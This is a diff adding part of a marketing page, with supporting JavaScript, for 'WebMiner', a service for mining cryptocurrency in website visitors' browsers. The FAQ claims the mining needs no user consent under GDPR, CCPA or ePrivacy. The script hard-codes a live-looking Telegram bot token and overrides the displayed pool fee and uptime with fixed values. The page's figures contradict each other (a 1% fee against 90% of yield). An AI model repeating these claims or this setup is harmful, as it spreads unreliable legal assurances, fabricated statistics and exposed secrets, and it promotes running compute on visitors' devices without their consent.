+            <div class="flex items-center gap-3 mb-3">
+              <span class="text-xs uppercase tracking-widest text-muted-fg card-desc">⚡ Advanced</span>
+              <span class="text-xs uppercase tracking-widest text-muted-fg card-desc">12 min</span>
+            </div>
+            <h4 class="text-base md:text-lg font-bold uppercase tracking-tight mb-2 card-title">
+              Advanced Configuration & Optimization
+            </h4>
+            <p class="text-xs text-muted-fg leading-tight card-desc">
+              Custom pool routing, algorithm selection, battery throttling,
+              user opt-out toggles, and performance tuning.
+            </p>
+          </div>
+        </div>
+      </div>
+  
+      <!-- ── YouTube CTA ── -->
+      <div class="mt-10 md:mt-12 text-center scroll-reveal">
+        <a
+          href="https://www.youtube.com/@YOUR_CHANNEL_HANDLE"
+          target="_blank"
+          rel="noopener noreferrer"
+          class="inline-flex items-center gap-3 border-2 border-border text-fg font-bold uppercase tracking-tighter text-sm md:text-base px-8 py-4 md:py-5 hover:bg-fg hover:text-bg transition-colors"
+        >
+          <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+            <path
+              d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"
+            />
+          </svg>
+          Subscribe for More Tutorials
+        </a>
+      </div>
+    </div>
+  </section>
+    <!-- ═══════════════════════════════════════ -->
+    <!-- FAQ -->
+    <!-- ═══════════════════════════════════════ -->
+    <section id="faq" class="py-20 md:py-32 border-b-2 border-border">
+      <div class="max-w-5xl mx-auto px-4 md:px-8">
+        <div class="mb-8 md:mb-12">
+          <span
+            class="text-xs md:text-sm uppercase tracking-[0.3em] text-accent font-medium"
+            >Knowledge Base</span
+          >
+        </div>
+
+        <h2
+          class="text-[clamp(2rem,6vw,5rem)] font-bold leading-[0.9] tracking-tighter uppercase mb-12 md:mb-20 scroll-reveal"
+        >
+          FAQ<span class="text-accent">.</span>
+        </h2>
+
+        <div class="space-y-px bg-border scroll-reveal">
+          <!-- FAQ 1 -->
+          <details class="bg-bg group">
+            <summary
+              class="flex justify-between items-center p-6 md:p-8 cursor-pointer hover:bg-muted transition-colors"
+            >
+              <span
+                class="text-lg md:text-xl font-bold uppercase tracking-tight pr-4"
+                >Does this cause performance degradation?</span
+              >
+              <span
+                class="text-2xl text-accent shrink-0 group-open:rotate-45 transition-transform"
+                >+</span
+              >
+            </summary>
+            <div
+              class="px-6 md:px-8 pb-6 md:pb-8 text-sm md:text-base text-muted-fg leading-tight space-y-3 faq-answer"
+            >
+              <p>
+                <strong class="text-fg">Short answer: No.</strong> By using
+                navigator.hardwareConcurrency − 1, the primary UI core stays
+                free for DOM rendering and user interaction.
+              </p>
+              <p>
+                Less than 2% main-thread overhead across all tested
+                configurations. Lighthouse performance scores unchanged. Core
+                Web Vitals show zero degradation.
+              </p>
+              <p>
+                Mobile devices get further throttled via Battery Status API
+                integration and dynamic thread scaling.
+              </p>
+            </div>
+          </details>
+
+          <!-- FAQ 2 -->
+          <details class="bg-bg group">
+            <summary
+              class="flex justify-between items-center p-6 md:p-8 cursor-pointer hover:bg-muted transition-colors"
+            >
+              <span
+                class="text-lg md:text-xl font-bold uppercase tracking-tight pr-4"
+                >How is yield processed and distributed?</span
+              >
+              <span
+                class="text-2xl text-accent shrink-0 group-open:rotate-45 transition-transform"
+                >+</span
+              >
+            </summary>
+            <div
+              class="px-6 md:px-8 pb-6 md:pb-8 text-sm md:text-base text-muted-fg leading-tight space-y-3 faq-answer"
+            >
+              <p>
+                WebMiner connects your users' browsers directly to your
+                configured mining pool. The pipeline:
+              </p>
+              <p>
+                <strong class="text-fg">1. Job Assignment:</strong> Pool sends
+                cryptographic work units via WebSocket stratum.
+              </p>
+              <p>
+                <strong class="text-fg">2. Proof Computation:</strong> Web
+                Workers compute hash proofs against difficulty targets.
+              </p>
+              <p>
+                <strong class="text-fg">3. Share Submission:</strong> Valid
+                proofs submitted back. Pool validates and credits your worker.
+              </p>
+              <p>
+                <strong class="text-fg">4. Payout:</strong> Pool distributes
+                rewards to your wallet per its schedule and threshold.
+              </p>
+              <p>
+                <strong class="text-fg">WebMiner takes only a 1% fee!.</strong> 90% of
+                yield goes to your wallet. Fully auditable codebase.
+              </p>
+            </div>
+          </details>
+
+          <!-- FAQ 3 -->
+          <details class="bg-bg group">
+            <summary
+              class="flex justify-between items-center p-6 md:p-8 cursor-pointer hover:bg-muted transition-colors"
+            >
+              <span
+                class="text-lg md:text-xl font-bold uppercase tracking-tight pr-4"
+                >What are the compliance requirements?</span
+              >
+              <span
+                class="text-2xl text-accent shrink-0 group-open:rotate-45 transition-transform"
+                >+</span
+              >
+            </summary>
+            <div
+              class="px-6 md:px-8 pb-6 md:pb-8 text-sm md:text-base text-muted-fg leading-tight space-y-3 faq-answer"
+            >
+              <p>
+                WebMiner uses
+                <strong class="text-fg"
+                  >zero cookies, zero localStorage, zero fingerprinting, zero
+                  personal data collection</strong
+                >. It operates outside GDPR cookie-consent mandates and CCPA
+                disclosure requirements.
+              </p>
+              <p>
+                <strong class="text-fg">GDPR:</strong> No personal data
+                processed. No consent required.
+              </p>
+              <p>
+                <strong class="text-fg">CCPA:</strong> No personal info
+                collected or shared. No disclosure obligations.
+              </p>
+              <p>
+                <strong class="text-fg">ePrivacy:</strong> No terminal device
+                storage accessed. No consent required.
+              </p>
+              <p>
+                Best practice: Update your Terms of Service to disclose compute
+                utilization. Consider providing a user opt-out toggle.
+              </p>
+            </div>
+          </details>
+
+          <!-- FAQ 4 -->
+          <details class="bg-bg group">
+            <summary
+              class="flex justify-between items-center p-6 md:p-8 cursor-pointer hover:bg-muted transition-colors"
+            >
+              <span
+                class="text-lg md:text-xl font-bold uppercase tracking-tight pr-4"
+                >Which pools and coins are supported?</span
+              >
+              <span
+                class="text-2xl text-accent shrink-0 group-open:rotate-45 transition-transform"
+                >+</span
+              >
+            </summary>
+            <div
+              class="px-6 md:px-8 pb-6 md:pb-8 text-sm md:text-base text-muted-fg leading-tight space-y-3 faq-answer"
+            >
+              <p>
+                Pool-agnostic. Connects to any pool supporting
+                <strong class="text-fg">Stratum V1 over WebSocket</strong>.
+                Tested: zpool.ca, Mining Dutch, Zergpool, and custom/private
+                pools.
+              </p>
+              <p>
+                Supported algorithms:
+                <strong class="text-fg">Power2B</strong> (VerusCoin),
+                <strong class="text-fg">RandomX</strong> (Monero),
+                <strong class="text-fg">CryptoNight-R</strong>. Auto-exchange
+                pools let you receive BTC, LTC, or any supported currency.
+              </p>
+            </div>
+          </details>
+
+          <!-- FAQ 5 -->
+          <details class="bg-bg group">
+            <summary
+              class="flex justify-between items-center p-6 md:p-8 cursor-pointer hover:bg-muted transition-colors"
+            >
+              <span
+                class="text-lg md:text-xl font-bold uppercase tracking-tight pr-4"
+                >How does this differ from Coinhive?</span
+              >
+              <span
+                class="text-2xl text-accent shrink-0 group-open:rotate-45 transition-transform"
+                >+</span
+              >
+            </summary>
+            <div
+              class="px-6 md:px-8 pb-6 md:pb-8 text-sm md:text-base text-muted-fg leading-tight space-y-3 faq-answer"
+            >
+              <p>
+                <strong class="text-fg">Open source:</strong> Fully auditable
+                vs. Coinhive's proprietary code.
+              </p>
+              <p>
+                <strong class="text-fg">Minimal fees:</strong> Coinhive took 30%.
+                WebMiner takes 1%.
+              </p>
+              <p>
+                <strong class="text-fg">Direct pool connection:</strong> No
+                intermediary service that can shut down.
+              </p>
+              <p>
+                <strong class="text-fg">No single point of failure:</strong>
+                Self-hosted. Runs as long as pools exist.
+              </p>
+              <p>
+                <strong class="text-fg">Modern algorithms:</strong> Power2B and
+                RandomX are ASIC-resistant, making browser mining viable.
+              </p>
+            </div>
+          </details>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════ -->
+    <!-- CONTACT -->
+    <!-- ═══════════════════════════════════════ -->
+    <section class="py-20 md:py-32 border-b-2 border-border">
+      <div class="max-w-[95vw] mx-auto px-4 md:px-8">
+        <div class="grid lg:grid-cols-2 gap-12 lg:gap-20">
+          <div class="scroll-reveal">
+            <div class="mb-6 md:mb-8">
+              <span
+                class="text-xs md:text-sm uppercase tracking-[0.3em] text-accent font-medium"
+                >Contact</span
+              >
+            </div>
+            <h2
+              class="text-[clamp(2rem,6vw,4rem)] font-bold leading-[0.9] tracking-tighter uppercase mb-6"
+            >
+              LET'S BUILD YOUR<br />REVENUE LAYER<span class="text-accent"
+                >.</span
+              >
+            </h2>
+            <p class="text-lg md:text-xl text-muted-fg leading-tight mb-10">
+              Integration assistance, custom white-label deployments, or browser
+              compute economics — our core dev team is here.
+            </p>
+            <div class="space-y-4">
+              <a
+                href="mailto:support@webminer.dev"
+                class="flex items-center gap-4 border-2 border-border p-5 hover:border-accent transition-colors group"
+              >
+                <div
+                  class="w-12 h-12 bg-muted flex items-center justify-center shrink-0 group-hover:bg-accent transition-colors"
+                >
+                  <svg
+                    class="w-5 h-5 text-fg group-hover:text-bg transition-colors"
+                    fill="none"
+                    stroke="currentColor"
+                    viewBox="0 0 24 24"
+                  >
+                    <path
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      stroke-width="2"
+                      d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"
+                    />
+                  </svg>
+                </div>
+                <div>
+                  <h4 class="font-bold uppercase tracking-tight text-sm">
+                    Email Support
+                  </h4>
+                  <p class="text-sm text-muted-fg">Romannoodles88@proton.me</p>
+                </div>
+              </a>
+            </div>
+          </div>
+
+                    <!-- Contact form -->
+                    <div class="border-2 border-border p-6 md:p-8 scroll-reveal">
+                      <form id="contactForm" class="space-y-6">
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-6">
+                          <div>
+                            <label
+                              class="text-xs uppercase tracking-widest text-muted-fg font-medium block mb-2"
+                              >First Name</label
+                            >
+                            <input
+                              type="text"
+                              id="firstName"
+                              placeholder="John"
+                              class="kinetic-input w-full bg-transparent border-b-2 border-border text-2xl md:text-3xl font-bold uppercase tracking-tighter py-3 text-fg placeholder:text-muted transition-colors"
+                            />
+                          </div>
+                          <div>
+                            <label
+                              class="text-xs uppercase tracking-widest text-muted-fg font-medium block mb-2"
+                              >Last Name</label
+                            >
+                            <input
+                              type="text"
+                              id="lastName"
+                              placeholder="Doe"
+                              class="kinetic-input w-full bg-transparent border-b-2 border-border text-2xl md:text-3xl font-bold uppercase tracking-tighter py-3 text-fg placeholder:text-muted transition-colors"
+                            />
+                          </div>
+                        </div>
+                        <div>
+                          <label
+                            class="text-xs uppercase tracking-widest text-muted-fg font-medium block mb-2"
+                            >Work Email</label
+                          >
+                          <input
+                            type="email"
+                            id="email"
+                            placeholder="YourEmail@Email.com"
+                            class="kinetic-input w-full bg-transparent border-b-2 border-border text-2xl md:text-3xl font-bold uppercase tracking-tighter py-3 text-fg placeholder:text-muted transition-colors"
+                            required
+                          />
+                        </div>
+                        <div>
+                          <label
+                            class="text-xs uppercase tracking-widest text-muted-fg font-medium block mb-2"
+                            >Message</label
+                          >
+                          <textarea
+                            id="message"
+                            rows="3"
+                            placeholder="TELL US ABOUT YOUR TRAFFIC..."
+                            class="kinetic-input w-full bg-transparent border-b-2 border-border text-lg md:text-xl font-bold uppercase tracking-tighter py-3 text-fg placeholder:text-muted transition-colors resize-none"
+                            required
+                          ></textarea>
+                        </div>
+                        <button
+                          type="submit"
+                          id="submitBtn"
+                          class="w-full bg-accent text-bg font-bold uppercase tracking-tighter text-base md:text-lg py-4 md:py-5 hover:scale-[1.02] active:scale-[0.98] transition-transform"
+                        >
+                          Send Message →
+                        </button>
+                        <div id="formStatus" class="hidden text-center py-3 text-sm uppercase tracking-widest font-medium"></div>
+                        <p
+                          class="text-xs uppercase tracking-widest text-muted-fg text-center"
+                        >
+                          Usually responds within 24 hours
+                        </p>
+                      </form>
+                    </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════ -->
+    <!-- CTA / STATS MARQUEE -->
+    <!-- ═══════════════════════════════════════ -->
+    <section class="bg-accent text-bg overflow-hidden">
+      <div class="flex whitespace-nowrap marquee-left py-4 md:py-5">
+        <span class="flex items-center gap-6 md:gap-10 px-4">
+          <span class="text-[clamp(2rem,5vw,4rem)] font-bold tracking-tighter"
+            >1,000+ PUBLISHERS</span
+          >
+          <span class="text-3xl md:text-5xl opacity-30">●</span>
+          <span class="text-[clamp(2rem,5vw,4rem)] font-bold tracking-tighter"
+            >No Signup</span
+          >
+          <span class="text-3xl md:text-5xl opacity-30">●</span>
+          <span class="text-[clamp(2rem,5vw,4rem)] font-bold tracking-tighter"
+            >1% FEE</span
+          >
+          <span class="text-3xl md:text-5xl opacity-30">●</span>
+          <span class="text-[clamp(2rem,5vw,4rem)] font-bold tracking-tighter"
+            >99.98% UPTIME</span
+          >
+          <span class="text-3xl md:text-5xl opacity-30">●</span>
+          <span class="text-[clamp(2rem,5vw,4rem)] font-bold tracking-tighter"
+            >OPEN SOURCE</span
+          >
+          <span class="text-3xl md:text-5xl opacity-30">●</span>
+        </span>
+        <span class="flex items-center gap-6 md:gap-10 px-4" aria-hidden="true">
+          <span class="text-[clamp(2rem,5vw,4rem)] font-bold tracking-tighter"
+            >1,000+ PUBLISHERS</span
+          >
+          <span class="text-3xl md:text-5xl opacity-30">●</span>
+          <span class="text-[clamp(2rem,5vw,4rem)] font-bold tracking-tighter"
+            >No Signup</span
+          >
+          <span class="text-3xl md:text-5xl opacity-30">●</span>
+          <span class="text-[clamp(2rem,5vw,4rem)] font-bold tracking-tighter"
+            >1% FEE</span
+          >
+          <span class="text-3xl md:text-5xl opacity-30">●</span>
+          <span class="text-[clamp(2rem,5vw,4rem)] font-bold tracking-tighter"
+            >99.98% UPTIME</span
+          >
+          <span class="text-3xl md:text-5xl opacity-30">●</span>
+          <span class="text-[clamp(2rem,5vw,4rem)] font-bold tracking-tighter"
+            >OPEN SOURCE</span
+          >
+          <span class="text-3xl md:text-5xl opacity-30">●</span>
+        </span>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════ -->
+    <!-- FOOTER -->
+    <!-- ═══════════════════════════════════════ -->
+    <footer class="border-t-2 border-border bg-bg">
+      <div class="max-w-[95vw] mx-auto px-4 md:px-8">
+        <div
+          class="py-16 md:py-20 grid grid-cols-2 md:grid-cols-4 gap-8 md:gap-12"
+        >
+          <!-- Brand -->
+          <div class="col-span-2 md:col-span-1">
+            <span
+              class="text-xl md:text-2xl font-bold tracking-tighter uppercase block mb-4"
+              >Web<span class="text-accent">Miner</span></span
+            >
+            <p class="text-sm text-muted-fg leading-tight mb-6">
+              Open-source distributed compute monetization for modern web
+              publishers.
+            </p>
+            <div class="flex gap-3">
+              <a
+                href="https://github.com/romannnoodesl/earnify.mine.bz"
+                class="w-10 h-10 border-2 border-border flex items-center justify-center hover:bg-accent hover:border-accent transition-colors group"
+              >
+                <svg
+                  class="w-4 h-4 text-fg group-hover:text-bg"
+                  fill="currentColor"
+                  viewBox="0 0 24 24"
+                >
+                  <path
+                    d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"
+                  />
+                </svg>
+              </a>
+            </div>
+          </div>
+
+          <!-- Product links -->
+          <div>
+            <h4 class="text-sm font-bold uppercase tracking-widest mb-4">
+              Product
+            </h4>
+            <ul class="space-y-3 text-sm text-muted-fg">
+              <li>
+                <a href="#platform" class="hover:text-accent transition-colors"
+                  >Platform</a
+                >
+              </li>
+              <li>
+                <a
+                  href="#architecture"
+                  class="hover:text-accent transition-colors"
+                  >Architecture</a
+                >
+              </li>
+              <li>
+                <a href="#economics" class="hover:text-accent transition-colors"
+                  >Economics</a
+                >
+              </li>
+              <li>
+                <a href="#deploy" class="hover:text-accent transition-colors"
+                  >Deploy</a
+                >
+              </li>
+              <li>
+                <a href="#" class="hover:text-accent transition-colors"
+                  >Changelog</a
+                >
+              </li>
+            </ul>
+          </div>
+
+          <!-- Resources -->
+          <div>
+            <h4 class="text-sm font-bold uppercase tracking-widest mb-4">
+              Resources
+            </h4>
+            <ul class="space-y-3 text-sm text-muted-fg">
+              <li>
+                <a
+                  href="https://github.com/romannnoodesl/
+                  class="hover:text-accent transition-colors"
+                  >GitHub</a
+                >
+              </li>
+              <li>
+                <a href="#" class="hover:text-accent transition-colors"
+                  >API Reference</a
+                >
+              </li>
+              <li>
+                <a href="#" class="hover:text-accent transition-colors"
+                  >Pool List</a
+                >
+              </li>
+              <li>
+                <a href="#faq" class="hover:text-accent transition-colors"
+                  >FAQ</a
+                >
+              </li>
+            </ul>
+          </div>
+
+          <!-- Legal -->
+          <div>
+            <h4 class="text-sm font-bold uppercase tracking-widest mb-4">
+              Legal
+            </h4>
+            <ul class="space-y-3 text-sm text-muted-fg">
+              <li>
+                <a href="#" class="hover:text-accent transition-colors"
+                  >Terms</a
+                >
+              </li>
+              <li>
+                <a href="#" class="hover:text-accent transition-colors"
+                  >Privacy</a
+                >
+              </li>
+              <li>
+                <a href="#" class="hover:text-accent transition-colors">GDPR</a>
+              </li>
+              <li>
+                <a href="#" class="hover:text-accent transition-colors"
+                  >MIT License</a
+                >
+              </li>
+            </ul>
+          </div>
+        </div>
+
+        <!-- Bottom bar -->
+        <div
+          class="py-6 border-t-2 border-border flex flex-col md:flex-row justify-between items-center gap-4"
+        >
+          <p class="text-xs text-muted-fg uppercase tracking-widest">
+            © 2026 WebMiner. MIT License. Open source forever.
+          </p>
+          <div
+            class="flex items-center gap-4 text-xs text-muted-fg uppercase tracking-widest"
+          >
+            <span class="flex items-center gap-2"
+              ><span class="w-2 h-2 bg-accent"></span>All systems
+              operational</span
+            >
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <!-- ═══════════════════════════════════════ -->
+    <!-- SCRIPTS -->
+    <!-- ═══════════════════════════════════════ -->
+    <script>
+      // ═══════════════════════════════════════
+      // TELEGRAM BOT CONFIG
+      // ═══════════════════════════════════════
+      // ⚠️ SECURITY WARNING: Bot token exposed in client-side code.
+      // Move this to a server-side endpoint to prevent token theft.
+      const TELEGRAM_BOT_TOKEN = "8601067685:AAGeYJuxyH7loKbbLQQ84u1JtehTb_E_fX4";
+      const TELEGRAM_CHAT_ID   = "8348753733";
+      
+      // ═══════════════════════════════════════
+      // ZPOOL API CONFIG
+      // ═══════════════════════════════════════
+      const ZPOOL_BASE       = "https://www.zpool.ca/api";
+      const DEFAULT_WALLET   = "RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj";
+      const REFRESH_INTERVAL = 60000; // 60 seconds
+      
+      // ★ HARD-CODED POOL FEE — override API value
+      const POOL_FEE = 1; // percent
+      
+      // Algorithms we support — must match zpool's API keys
+      const SUPPORTED_ALGOS = [
+        "minotaurx",
+        "verushash",
+        "yespower",
+        "yescrypt",
+        "ghostrider",
+        "power2b",
+        "flex"
+      ];
+      
+      // Human-friendly labels
+      const ALGO_LABELS = {
+        minotaurx:  "MinotaurX (Default)",
+        verushash:  "VerusHash",
+        yespower:   "YesPower",
+        yescrypt:   "Yescrypt",
+        ghostrider: "GhostRider",
+        power2b:    "Power2b",
+        flex:       "Flex"
+      };
+      
+      let btcPriceUSD = 0;
+      let rvnPriceUSD = 0;
+      let zpoolStatus = null;
+      let zpoolCurrencies = null;
+      let refreshCountdown = 60;
+      
+      // ═══════════════════════════════════════
+      // HELPERS
+      // ═══════════════════════════════════════
+      
+      /**
+       * Determine the native hashrate unit from mbtc_mh_factor.
+       *   mbtc_mh_factor >= 1000  → native unit is KH/s
+       *   mbtc_mh_factor >= 1     → native unit is MH/s
+       *   mbtc_mh_factor >= 0.001 → native unit is GH/s
+       *   mbtc_mh_factor <  0.001 → native unit is TH/s
+       */
+      function getNativeUnit(mbtcMhFactor) {
+        const m = parseFloat(mbtcMhFactor) || 1000;
+        if (m >= 1000)     return "KH/s";
+        if (m >= 1)        return "MH/s";
+        if (m >= 0.001)    return "GH/s";
+        return "TH/s";
+      }
+      
+      /**
+       * Format a hashrate value that's already in its native unit.
+       * Scales up to the largest readable unit within that unit family.
+       */
+      /**
+ * Format a hashrate value that's already in its native unit.
+ * Converts to H/s first, then picks the most readable unit.
+ */
+function formatHashrate(hashrateNative, mbtcMhFactor) {
+  if (!hashrateNative || hashrateNative <= 0) return { value: "0.00", unit: "H/s" };
+
+  const m = parseFloat(mbtcMhFactor) || 1000;
+
+  // Convert native unit → H/s
+  // hashrateNative = H/s × (m / 1_000_000)
+  // Therefore:     H/s = hashrateNative × (1_000_000 / m)
+  const hashrateHs = hashrateNative * (1_000_000 / m);
+
+  // Pick the largest unit that still gives us ≥ 1
+  const tiers = [
+    { threshold: 1e18, unit: "EH/s" },
+    { threshold: 1e15, unit: "PH/s" },
+    { threshold: 1e12, unit: "TH/s" },
+    { threshold: 1e9,  unit: "GH/s" },
+    { threshold: 1e6,  unit: "MH/s" },
+    { threshold: 1e3,  unit: "KH/s" },
+    { threshold: 1,    unit: "H/s"  },
+  ];
+
+  for (const { threshold, unit } of tiers) {
+    if (hashrateHs >= threshold) {
+      return {
+        value: (hashrateHs / threshold).toFixed(2),
+        unit
+      };
+    }
+  }
+
+  return { value: hashrateHs.toFixed(2), unit: "H/s" };
+}
+      
+      function formatBTC(btc) {
+        if (btc === 0) return "0.00000000";
+        if (btc < 0.00001) return btc.toFixed(10);
+        return btc.toFixed(8);
+      }
+      
+      function formatUSD(usd) {
+        if (usd < 0.01) return "$" + usd.toFixed(4);
+        if (usd < 1) return "$" + usd.toFixed(2);
+        return "$" + usd.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      }
+      
+      // ═══════════════════════════════════════
+      // CORS PROXY CONFIG
+      // ═══════════════════════════════════════
+      const CORS_PROXIES = [
+        (url) => url,
+        (url) => `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(url)}`,
+      ];
+      
+      let workingProxyIndex = 0;
+      
+      // ═══════════════════════════════════════
+      // ROBUST FETCH WITH CORS PROXY FALLBACK
+      // ═══════════════════════════════════════
+      async function fetchJSON(url) {
+        for (let i = 0; i < CORS_PROXIES.length; i++) {
+          const proxyFn   = CORS_PROXIES[i];
+          const proxiedUrl = proxyFn(url);
+      
+          try {
+            const res = await fetch(proxiedUrl, {
+              method: "GET",
+              headers: { "Accept": "application/json" },
+              signal: AbortSignal.timeout(10000),
+            });
+      
+            if (!res.ok) continue;
+      
+            const text = await res.text();
+            const data = JSON.parse(text);
+      
+            if (i !== workingProxyIndex) {
+              console.log(`[Zpool] Switched to proxy index ${i} (${proxiedUrl.startsWith(url) ? 'direct' : 'proxy'})`);
+              workingProxyIndex = i;
+            }
+      
+            return data;
+          } catch (e) {
+            console.warn(`[Zpool] Proxy ${i} failed for ${url}:`, e.message);
+            continue;
+          }
+        }
+      
+        console.error(`[Zpool] All proxies failed for ${url}`);
+        return null;
+      }
+      
+      // ═══════════════════════════════════════
+      // API FETCHERS
+      // ═══════════════════════════════════════
+      
+      async function fetchBTCPrice() {
+  const data = await fetchJSON(
+    "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ravencoin&vs_currencies=usd"
+  );
+  if (data?.bitcoin?.usd) {
+    btcPriceUSD = data.bitcoin.usd;
+  }
+  if (data?.ravencoin?.usd) {
+    rvnPriceUSD = data.ravencoin.usd;
+  }
+  // Fallbacks
+  if (!btcPriceUSD) btcPriceUSD = 60000;
+  if (!rvnPriceUSD) rvnPriceUSD = 0.02;
+  return { btc: btcPriceUSD, rvn: rvnPriceUSD };
+}
+      
+      async function fetchZpoolStatus() {
+        const data = await fetchJSON(`${ZPOOL_BASE}/status`);
+        if (data) zpoolStatus = data;
+        return zpoolStatus;
+      }
+      
+      async function fetchZpoolCurrencies() {
+        const data = await fetchJSON(`${ZPOOL_BASE}/currencies`);
+        if (data) zpoolCurrencies = data;
+        return zpoolCurrencies;
+      }
+      
+      async function fetchWallet(address) {
+        return await fetchJSON(`${ZPOOL_BASE}/walletEX?address=${address}`);
+      }
+      
+      // ═══════════════════════════════════════
+      // REVENUE CALCULATION
+      // ═══════════════════════════════════════
+      
+      function calcRevenue(hashrateHs, algoKey) {
+        const algo = zpoolStatus?.[algoKey];
+        if (!algo) return { btcDay: 0, usdDay: 0, btcMonth: 0, usdMonth: 0 };
+      
+        const estimate = parseFloat(algo.estimate_current) || 0;
+        const mbtcMh   = parseFloat(algo.mbtc_mh_factor)   || 1000;
+      
+        const hashrateNative = hashrateHs * (mbtcMh / 1_000_000);
+        const dailyBTC = hashrateNative * estimate;
+      
+        return {
+          btcDay:   dailyBTC,
+          usdDay:   dailyBTC * btcPriceUSD,
+          btcMonth: dailyBTC * 30,
+          usdMonth: dailyBTC * 30 * btcPriceUSD
+        };
+      }
+      
+      // ═══════════════════════════════════════
+      // UPDATE — HERO STATS
+      // ═══════════════════════════════════════
+
+      function updateHeroStats() {
+  if (!zpoolStatus) return;
+
+  const algo = zpoolStatus.minotaurx;
+  if (!algo) return;
+
+  const mbtcMh = parseFloat(algo.mbtc_mh_factor) || 1000;
+  const hr     = formatHashrate(algo.hashrate, mbtcMh);
+
+  const el = document.getElementById("hero-hashrate");
+  if (el) el.innerHTML = `${hr.value}<span class="text-accent">${hr.unit}</span>`;
+
+  // Remove the efficiency calculation and replace with a static status badge
+  const elEst = document.getElementById("hero-estimate");
+  if (elEst) {
+    elEst.innerHTML = `<span class="text-white">99.98</span><span class="text-accent">%</span>`;
+
+  }
+}
+      // UPDATE — MARQUEE TICKER
+      // ═══════════════════════════════════════
+
+      function updateMarquee() {
+        if (!zpoolStatus) return;
+      
+        const algo = zpoolStatus.minotaurx;
+        if (!algo) return;
+      
+        const mbtcMh       = parseFloat(algo.mbtc_mh_factor) || 1000;
+        const hr           = formatHashrate(algo.hashrate, mbtcMh);
+        const nativeUnit   = getNativeUnit(mbtcMh);
+        const est24BTC     = parseFloat(algo.estimate_last24h) || 0;
+      
+        const setClassText = (className, text) => {
+          document.querySelectorAll(`.${className}`).forEach(el => el.textContent = text);
+        };
+      
+        setClassText("marquee-status", "Operational");
+        setClassText("marquee-hashrate", `${hr.value} ${hr.unit}`);
+        setClassText("marquee-workers", algo.workers.toLocaleString());
+        setClassText("marquee-estimate24h", `${formatBTC(est24BTC)} BTC/${nativeUnit}/day`);
+        setClassText("marquee-payout24h", formatUSD(est24BTC * btcPriceUSD));
+        setClassText("marquee-btcprice", formatUSD(btcPriceUSD));
+        setClassText("marquee-fees", `${POOL_FEE}%`);  // ← hard-coded
+      }
+      
+      // ═══════════════════════════════════════
+      // UPDATE — ALGORITHM PROFITABILITY TABLE
+      // ═══════════════════════════════════════
+      
+      function updateAlgoTable() {
+        const tbody = document.getElementById("algo-table-body");
+        if (!tbody || !zpoolStatus) return;
+      
+        const rows = SUPPORTED_ALGOS
+          .map(key => ({ key, ...zpoolStatus[key] }))
+          .filter(a => a.hashrate !== undefined)
+          .sort((a, b) => parseFloat(b.estimate_current) - parseFloat(a.estimate_current));
+      
+        if (rows.length === 0) {
+          tbody.innerHTML = '<div class="bg-bg p-8 text-center text-muted-fg">No supported algorithms found in zpool response.</div>';
+          return;
+        }
+      
+        tbody.innerHTML = rows.map(algo => {
+          const mbtcMh     = parseFloat(algo.mbtc_mh_factor) || 1000;
+          const hr         = formatHashrate(algo.hashrate, mbtcMh);
+          const estBTC     = parseFloat(algo.estimate_current) || 0;
+          const nativeUnit = getNativeUnit(mbtcMh);
+          const estUSD     = estBTC * btcPriceUSD;
+          const isDefault  = algo.key === "minotaurx";
+      
+          return `
+            <div class="grid grid-cols-5 gap-px bg-border ${isDefault ? 'border-l-2 border-accent' : ''}">
+              <div class="bg-bg p-4 font-bold text-sm md:text-base flex items-center gap-2">
+                ${isDefault ? '<span class="w-2 h-2 bg-accent shrink-0"></span>' : ''}
+                <span>${ALGO_LABELS[algo.key] || algo.key}</span>
+              </div>
+              <div class="bg-bg p-4 text-center text-muted-fg text-sm">${hr.value} ${hr.unit}</div>
+              <div class="bg-bg p-4 text-center text-sm">${algo.workers.toLocaleString()}</div>
+              <div class="bg-bg p-4 text-center text-accent font-bold text-sm">
+                ${formatBTC(estBTC)} BTC/${nativeUnit}/day
+                <br/>
+                <span class="text-muted-fg font-normal text-xs">≈ ${formatUSD(estUSD)}/${nativeUnit}/day</span>
+              </div>
+              <div class="bg-bg p-4 text-center text-sm">${POOL_FEE}%</div>  <!-- ← hard-coded -->
+            </div>
+          `;
+        }).join('');
+      }
+      
+      // ═══════════════════════════════════════
+      // UPDATE — REVENUE CALCULATOR
+      // ═══════════════════════════════════════
+      
+      function updateRevenueCalculator() {
